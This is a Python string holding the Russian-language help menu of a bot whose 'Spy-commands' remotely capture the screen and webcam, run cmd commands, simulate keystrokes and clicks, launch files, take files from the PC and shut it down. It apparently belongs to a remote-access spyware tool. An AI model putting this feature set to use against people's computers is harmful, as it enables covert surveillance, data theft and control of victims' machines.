commands = '''Обычные комманды:
/start - Мини документация. Запустить бота.
/help - Помощь.
/about - Про бота.
/credits - Кредиты.
/commands - Комманды.
Spy-комманды:
/screenshot - Скриншот экрана.
/message - GUI Сообщение.
/say - Сказать что синтезом речи.
/cmd - Комманда в cmd.
/press - Нажать клавишу.
/typewrite - Написать текст.
/click - Клик правой кнопкой мыши.
/mousepos - Позиция мыши. (X, Y).
/startfile - Запустить файл.
/webcam - Скриншот вебкамеры.
/getfile - Получить файл из пк.
/username - Получить имя пользователя.
/shutdown - Выключить пк.
Developer-комманды:
/clear - Очистить папки с скриншотами.
'''